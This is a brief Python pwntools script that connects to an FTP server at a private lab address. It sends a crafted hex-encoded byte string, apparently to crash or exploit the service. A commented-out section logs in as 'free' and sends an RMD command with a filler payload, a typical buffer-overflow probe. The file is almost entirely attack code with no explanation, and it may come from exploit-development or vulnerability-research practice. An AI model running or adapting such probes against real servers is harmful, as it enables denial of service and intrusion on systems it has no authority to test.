#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *

context.log_level = "debug"
p = remote("192.168.245.131", 21)

# payload = "s" * 10
# p.send("USER free\r\n")
#
# p.recvuntil("Password")
# p.send("PASS free\r\n")
#
# p.recvuntil("free")
#
# p.send('RMD ' + payload + '\r\n')
#
# p.interactive()

p.send("00c1ffffffffd0fffffdffffff9a00d000".decode("hex"))
